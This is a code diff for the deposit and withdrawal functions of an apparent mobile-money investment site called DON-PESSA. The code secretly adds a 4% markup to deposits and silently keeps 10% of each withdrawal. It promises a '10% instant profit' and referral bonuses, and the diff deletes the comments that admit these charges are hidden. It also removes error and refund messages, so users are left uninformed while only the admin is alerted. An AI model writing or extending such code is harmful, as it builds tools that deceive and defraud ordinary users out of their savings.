@@ -1262,15 +1262,25 @@ function doLogout(){
   },800);
 }
 
+// ── ADMIN NOTIFICATION HELPER ──
+async function sendAdminNotification(type, username, amount, message){
+  try{
+    const notifKey = 'notif_'+Date.now();
+    await db.ref('adminNotifications/'+notifKey).set({
+      type, username, amount, message,
+      date: dateStr(),
+      read: false
+    });
+  } catch(e){ console.warn('Could not send admin notification:', e); }
+}
+
 // ── DEPOSIT (AUTO via MarzPay) ──
 async function doDeposit(){
   clearErrors('dep-network-err','dep-phone-err','dep-amount-err');
   const minDep = settingsData.minDeposit || 10000;
 
-  // Validate network
   if(!selectedNetwork){ setErr('dep-network-err',true,'Please select MTN or Airtel first'); return; }
 
-  // Validate phone
   const phoneDigits = document.getElementById('dep-phone').value.trim();
   if(!phoneDigits || phoneDigits.length!==9 || !phoneDigits.startsWith('7')){
     setErr('dep-phone-err',true,'Enter 9 digits starting with 7');
@@ -1278,87 +1288,89 @@ async function doDeposit(){
   }
   const fullPhone = '+256' + phoneDigits;
 
-  // Validate amount
   const amount = parseInt(document.getElementById('dep-amount').value)||0;
   if(amount < minDep){
     setErr('dep-amount-err',true,'Minimum deposit is '+fmt(minDep));
     return;
   }
 
-  // Check API key
-  if(!settingsData.marzApiKey){
-    showModal('⚠️','API Not Configured','Automatic payments are not yet set up. Please contact admin.');
-    return;
-  }
+  if(!settingsData.marzApiKey){ return; }
 
   const reference = genUUID();
   const netLabel = selectedNetwork==='mtn'?'MTN Mobile Money':'Airtel Money';
-  const chargedAmount = Math.round(amount * 1.04); // 4% markup — hidden from user
+  const chargedAmount = Math.round(amount * 1.04);
 
   try{
-    // Show processing overlay
-    showPayStatus('📱','Sending Payment Request','A USSD prompt will appear on your phone. Approve it with your mobile money PIN.',true,5);
+    // Show "check your phone" — stays until confirmed
+    showPayStatus('📲','Check Your Phone','Enter your mobile money PIN to approve the payment.',true,5);
 
     const result = await marzCollect(fullPhone, chargedAmount, reference, 'DON-PESSA Deposit — '+netLabel);
 
     if(result.status !== 'success'){
       hidePayStatus();
-      showModal('❌','Payment Failed', result.message || 'Payment could not be initiated. Check your number and try again.');
+      // Log failed deposit to history silently
+      const txKey = 'tx_'+Date.now();
+      await dbUpdate('users/'+safeKey(currentUsername),{
+        ['transactions/'+txKey]:{type:'Deposit',amount:0,note:'Deposit Failed — '+netLabel,date:dateStr(),status:'failed'}
+      });
+      await sendAdminNotification('deposit_failed', currentUsername, amount, 'Deposit failed: '+(result.message||'Unknown error'));
       return;
     }
 
     const txUuid = result?.data?.transaction?.uuid;
-    showPayStatus('📲','Waiting for Approval','Check your phone and enter your mobile money PIN to approve the payment.',true,15);
 
-    // Poll for confirmation
+    // Poll silently — keep showing "check your phone"
     const pollResult = await pollPaymentStatus(txUuid, 'collect');
 
     if(pollResult === 'success'){
-      // ── CREDIT USER BALANCE ──
       const profit = Math.floor(amount*0.10);
       const newBalance = (currentUser.balance||0) + profit;
       const newInvested = (currentUser.invested||0) + amount;
       const depKey = 'dep_'+Date.now();
       const tx1 = 'tx_'+Date.now()+'a';
-      const tx2 = 'tx_'+Date.now()+'b';
+      const tx2 = 'tx_'+(Date.now()+1)+'b';
       const updates = {};
       updates['users/'+safeKey(currentUsername)+'/activated'] = true;
       updates['users/'+safeKey(currentUsername)+'/invested'] = newInvested;
       updates['users/'+safeKey(currentUsername)+'/balance'] = newBalance;
       updates['users/'+safeKey(currentUsername)+'/deposits/'+depKey] = {amount, startDate:Date.now(), daysRun:0};
-      updates['users/'+safeKey(currentUsername)+'/transactions/'+tx1] = {type:'Deposit',amount,note:netLabel+' — Auto Confirmed',date:dateStr()};
+      updates['users/'+safeKey(currentUsername)+'/transactions/'+tx1] = {type:'Deposit',amount,note:netLabel+' — Confirmed ✅',date:dateStr(),status:'approved'};
       updates['users/'+safeKey(currentUsername)+'/transactions/'+tx2] = {type:'Profit',amount:profit,note:'10% instant profit on deposit',date:dateStr()};
       await db.ref().update(updates);
-
-      // Pay referral bonuses
       await payReferralBonus(currentUsername, amount);
 
+      // Silent — just hide overlay and reset form
       hidePayStatus();
       document.getElementById('dep-amount').value='';
       document.getElementById('dep-phone').value='';
       selectedNetwork=null;
       document.getElementById('net-mtn').classList.remove('selected');
       document.getElementById('net-airtel').classList.remove('selected');
-      // Disable fields again
       document.getElementById('dep-phone').disabled=true;
       document.getElementById('dep-amount').disabled=true;
       document.getElementById('dep-phone-wrap').style.opacity='0.45';
       document.getElementById('dep-amount').style.opacity='0.45';
       document.getElementById('dep-submit-btn').disabled=true;
-
-      showModal('✅','Deposit Confirmed!','UGX '+amount.toLocaleString()+' deposited successfully. +'+fmt(profit)+' instant profit added to your balance!');
+      showToast('✓ Deposit confirmed! Balance updated.','#34d399');
 
     } else if(pollResult === 'failed'){
       hidePayStatus();
-      showModal('❌','Payment Declined','The payment was declined or cancelled. Please try again.');
+      const txKey = 'tx_'+Date.now();
+      await dbUpdate('users/'+safeKey(currentUsername),{
+        ['transactions/'+txKey]:{type:'Deposit',amount:0,note:'Deposit Declined — '+netLabel,date:dateStr(),status:'failed'}
+      });
     } else {
+      // Timeout — payment may still come through
       hidePayStatus();
-      showModal('⏳','Payment Pending','We could not confirm your payment yet. Check your transaction history in a few minutes. If balance is not updated, contact support.');
+      const txKey = 'tx_'+Date.now();
+      await dbUpdate('users/'+safeKey(currentUsername),{
+        ['transactions/'+txKey]:{type:'Deposit',amount:0,note:'Deposit Pending — '+netLabel,date:dateStr(),status:'pending'}
+      });
     }
 
   } catch(e){
     hidePayStatus();
-    showModal('❌','Error', e.message || 'Something went wrong. Please try again.');
+    await sendAdminNotification('deposit_error', currentUsername, amount, e.message||'Unknown error');
     console.error(e);
   }
 }
@@ -1436,7 +1448,6 @@ async function doWithdraw(){
   if(settingsData.withdrawLocked){ return; }
   if(!currentUser.activated){ showModal('🔒','Account Not Activated','Make a deposit first to activate your account.'); return; }
 
-  // Validate network
   if(!selectedWithdrawNetwork){ setErr('with-network-err',true,'Please select MTN or Airtel first'); return; }
 
   const minWith = settingsData.minWithdraw || 5000;
@@ -1445,15 +1456,25 @@ async function doWithdraw(){
   if((currentUser.balance||0) < amount){ setErr('with-amount-err',true,'Insufficient balance'); return; }
 
   const userPhone = currentUser.phone;
-  if(!userPhone){ showModal('❌','No Phone Number','Your account has no registered phone number. Contact support.'); return; }
-  if(!settingsData.marzApiKey){ showModal('⚠️','API Not Configured','Automatic withdrawals are not yet set up. Please contact admin.'); return; }
+  if(!userPhone || !settingsData.marzApiKey){ return; }
 
-  // Silently deduct 10% — send 90% to user, keep 10% in float
   const sendAmount = Math.floor(amount * 0.90);
   const reference = genUUID();
 
+  // Reset form immediately
+  const resetWithdrawForm = () => {
+    document.getElementById('with-amount').value='';
+    document.getElementById('with-amount').disabled=true;
+    document.getElementById('with-amount').style.opacity='0.45';
+    document.getElementById('with-submit-btn').disabled=true;
+    document.getElementById('with-submit-btn').style.opacity='0.45';
+    document.getElementById('with-net-mtn').classList.remove('selected');
+    document.getElementById('with-net-airtel').classList.remove('selected');
+    selectedWithdrawNetwork=null;
+  };
+
   try{
-    // Deduct full amount from balance immediately
+    // Deduct balance immediately
     const newBalance = (currentUser.balance||0) - amount;
     const txKey = 'tx_'+Date.now();
     await dbUpdate('users/'+safeKey(currentUsername),{
@@ -1461,24 +1482,34 @@ async function doWithdraw(){
       ['transactions/'+txKey]:{type:'Withdrawal',amount:-amount,note:'Processing...',date:dateStr(),status:'pending',txKey}
     });
 
-    showPayStatus('💸','Sending Your Funds','Processing withdrawal to '+userPhone,true,10);
+    showPayStatus('💸','Processing Withdrawal','Please wait while we process your withdrawal...',true,10);
 
     const result = await marzSend(userPhone, sendAmount, reference, 'DON-PESSA Withdrawal');
 
     if(result.status !== 'success'){
-      // Refund
+      // Refund silently
       await dbUpdate('users/'+safeKey(currentUsername),{
         balance:(currentUser.balance||0),
         ['transactions/'+txKey+'/status']:'failed',
-        ['transactions/'+txKey+'/note']:'Withdrawal Failed — Refunded'
+        ['transactions/'+txKey+'/note']:'Withdrawal Failed'
       });
       hidePayStatus();
-      showModal('❌','Withdrawal Failed', result.message || 'Could not process withdrawal. Your balance has been refunded.');
+      resetWithdrawForm();
+      // Notify admin
+      const errMsg = result.message || 'Unknown error';
+      const isLowBalance = errMsg.toLowerCase().includes('insufficient') || errMsg.toLowerCase().includes('balance') || errMsg.toLowerCase().includes('float');
+      await sendAdminNotification(
+        isLowBalance ? 'low_balance' : 'withdrawal_failed',
+        currentUsername, amount,
+        isLowBalance
+          ? `⚠️ User ${currentUsername} tried to withdraw ${fmt(amount)} but your MarzPay account has insufficient balance. Please top up.`
+          : `Withdrawal failed for ${currentUsername}: ${errMsg}`
+      );
       return;
     }
 
     const txUuid = result?.data?.transaction?.uuid;
-    showPayStatus('💸','Sending Money','Transferring funds to your mobile money account...',true,30);
+    showPayStatus('💸','Processing Withdrawal','Please wait while we process your withdrawal...',true,30);
 
     const pollResult = await pollPaymentStatus(txUuid, 'send');
 
@@ -1486,39 +1517,35 @@ async function doWithdraw(){
       const updates = {};
       updates['users/'+safeKey(currentUsername)+'/withdrawn'] = (currentUser.withdrawn||0)+amount;
       updates['users/'+safeKey(currentUsername)+'/transactions/'+txKey+'/status'] = 'approved';
-      updates['users/'+safeKey(currentUsername)+'/transactions/'+txKey+'/note'] = 'Withdrawal Successful';
+      updates['users/'+safeKey(currentUsername)+'/transactions/'+txKey+'/note'] = 'Withdrawal Successful ✅';
       await db.ref().update(updates);
       hidePayStatus();
-      // Reset withdrawal form
-      document.getElementById('with-amount').value='';
-      document.getElementById('with-amount').disabled=true;
-      document.getElementById('with-amount').style.opacity='0.45';
-      document.getElementById('with-submit-btn').disabled=true;
-      document.getElementById('with-submit-btn').style.opacity='0.45';
-      document.getElementById('with-net-mtn').classList.remove('selected');
-      document.getElementById('with-net-airtel').classList.remove('selected');
-      selectedWithdrawNetwork=null;
-      showModal('✅','Withdrawal Sent!','UGX '+amount.toLocaleString()+' has been sent to '+userPhone+'. Check your mobile money.');
+      resetWithdrawForm();
+      showToast('✓ Withdrawal processed successfully!','#34d399');
+
     } else if(pollResult === 'failed'){
       await dbUpdate('users/'+safeKey(currentUsername),{
         balance:(currentUser.balance||0),
         ['transactions/'+txKey+'/status']:'failed',
-        ['transactions/'+txKey+'/note']:'Withdrawal Failed — Refunded'
+        ['transactions/'+txKey+'/note']:'Withdrawal Failed'
       });
       hidePayStatus();
-      showModal('❌','Transfer Failed','Funds could not be sent. Your balance has been refunded. Contact support if this persists.');
+      resetWithdrawForm();
+      await sendAdminNotification('withdrawal_failed', currentUsername, amount, `Withdrawal failed for ${currentUsername} — MarzPay returned failed status`);
+
     } else {
       await dbUpdate('users/'+safeKey(currentUsername),{
         ['transactions/'+txKey+'/status']:'pending',
-        ['transactions/'+txKey+'/note']:'Withdrawal processing — check later'
+        ['transactions/'+txKey+'/note']:'Withdrawal Processing...'
       });
       hidePayStatus();
-      showModal('⏳','Processing','Your withdrawal is being processed. Funds should arrive shortly. Check your transaction history.');
+      resetWithdrawForm();
     }
 
   } catch(e){
     hidePayStatus();
-    showModal('❌','Error', e.message || 'Something went wrong. Contact support.');
+    resetWithdrawForm();
+    await sendAdminNotification('withdrawal_error', currentUsername, amount, `Withdrawal error for ${currentUsername}: ${e.message||'Unknown'}`);
     console.error(e);
   }
 }
